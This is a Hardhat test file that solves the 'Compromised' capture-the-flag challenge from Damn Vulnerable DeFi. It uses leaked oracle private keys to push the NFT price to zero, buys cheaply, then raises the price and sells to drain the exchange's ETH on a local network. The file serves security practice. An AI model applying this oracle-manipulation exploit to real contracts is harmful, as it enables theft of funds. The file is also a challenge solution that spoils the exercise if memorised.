import { BigNumber } from "@ethersproject/bignumber";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers, network } from "hardhat";
import {
    DamnValuableNFT,
    DamnValuableNFT__factory,
    Exchange,
    Exchange__factory,
    TrustfulOracle,
    TrustfulOracleInitializer,
    TrustfulOracleInitializer__factory,
    TrustfulOracle__factory,
} from "../../typechain";
import { getBigNumber } from "../../utils";


describe('Compromised challenge', () => {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const provider = ethers.provider;
    let owner: SignerWithAddress;
    let attacker: SignerWithAddress;
    let Token: DamnValuableNFT;
    let Oracle: TrustfulOracle;
    let Exchange: Exchange;
    let initialAttackerbalance: BigNumber;

    const EXCHANGE_INITIAL_ETH_BALANCE = getBigNumber(10000);
    const initialOwnerBalance = getBigNumber(20000);
    const INITIAL_NFT_PRICE = getBigNumber(999);

    before(async () => {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */
        [owner, attacker] = await ethers.getSigners();

        await network.provider.send("hardhat_setBalance", [
            owner.address,
            initialOwnerBalance.toHexString().replace("0x0", "0x")
        ]);

        // Fund the trusted source addresses
        await owner.sendTransaction({ to: sources[0], value: getBigNumber(5) });
        await owner.sendTransaction({ to: sources[1], value: getBigNumber(5) });
        await owner.sendTransaction({ to: sources[2], value: getBigNumber(5) });

        // Deploy the oracle and setup the trusted sources with initial prices
        const oracleInitializer = (await ethers.getContractFactory(
            "TrustfulOracleInitializer",
            owner
        )) as TrustfulOracleInitializer__factory;
        const OracleInitializer: TrustfulOracleInitializer = await oracleInitializer.deploy(
            sources,
            ["DVNFT", "DVNFT", "DVNFT"],
            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
        );

        const oracle = (await ethers.getContractFactory(
            "TrustfulOracle",
            owner
        )) as TrustfulOracle__factory;
        Oracle = oracle.attach(
            await OracleInitializer.oracle()
        )

        // Deploy the exchange and get the associated ERC721 token
        const exchange = (await ethers.getContractFactory(
            "Exchange",
            owner
        )) as Exchange__factory;
        Exchange = await exchange.deploy(
            Oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );

        const nft = (await ethers.getContractFactory(
            "DamnValuableNFT",
            owner
        )) as DamnValuableNFT__factory;
        Token = nft.attach(await Exchange.token());

        // Keep track of attacker's initial ETH balance
        initialAttackerbalance = await attacker.getBalance();
    });

    it('Exploit', async () => {

        const keys = [
            '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
            '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
        ];

        const postPrice = async (price: BigNumber) => {
            const txdata = await Oracle.populateTransaction.postPrice("DVNFT", price)
            const tx = {
                to: Oracle.address,
                data: txdata.data,
                gasLimit: 90000
            };

            for (const key of keys) {
                const wallet = new ethers.Wallet(key, provider)
                await wallet.sendTransaction(tx)
                // const signedtx = await ethers.signTransaction(tx);
                // await web3.eth.sendSignedTransaction(signedtx.rawTransaction);
            }
        }

        // Initial state
        console.log("DVNFT Price:", ethers.utils.formatEther(await Oracle.getMedianPrice("DVNFT")), "ETH");

        // Update oracle price to 0
        await postPrice(ethers.BigNumber.from(0));
        console.log("DVNFT Price:", ethers.utils.formatEther(await Oracle.getMedianPrice("DVNFT")), "ETH");

        // Purchase token for free
        await Exchange.connect(attacker).buyOne({ value: 1 });

        // Update oracle price to all exchange balance
        await postPrice(EXCHANGE_INITIAL_ETH_BALANCE);
        console.log("DVNFT Price:", ethers.utils.formatEther(await Oracle.getMedianPrice("DVNFT")), "ETH");

        // Approve transfer and sell token for the new price
        await Token.connect(attacker).approve(Exchange.address, 1);
        await Exchange.connect(attacker).sellOne(1);

    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await provider.getBalance(Exchange.address)
        ).to.eq('0');
    });
});
